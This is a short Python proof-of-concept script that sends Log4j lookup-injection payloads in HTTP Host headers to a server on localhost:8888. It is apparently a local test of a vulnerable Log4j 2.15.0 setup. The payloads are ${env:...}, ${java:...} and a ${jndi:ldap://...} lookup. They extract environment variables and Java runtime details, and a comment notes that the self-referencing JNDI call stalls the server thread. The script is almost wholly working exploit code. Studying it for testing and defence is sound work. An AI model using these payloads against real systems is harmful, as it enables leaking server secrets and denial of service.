import requests


host = 'http://localhost:8888'

print("Completed request with response: ", requests.get(host, headers={'Host': '${env:USER}'}).text)
print("Completed request with response: ", requests.get(host, headers={'Host': '${env:SESSION_MANAGER}'}).text)
print("Completed request with response: ", requests.get(host, headers={'Host': '${java:runtime}'}).text)
print("Completed request with response: ", requests.get(host, headers={'Host': '${java:os}'}).text)

# Only local JNDI lookups will work since 2.15.0
# This version makes best-effort attempt to stop remote JNDI calls
# However simply rerouting the call to the web server itself leads to arresting the thread  :)
print("Completed request with response: ", requests.get(
    host,
    headers={'Host': '${jndi:ldap://localhost:8888/foo/bar}'},
    timeout=4
).text)
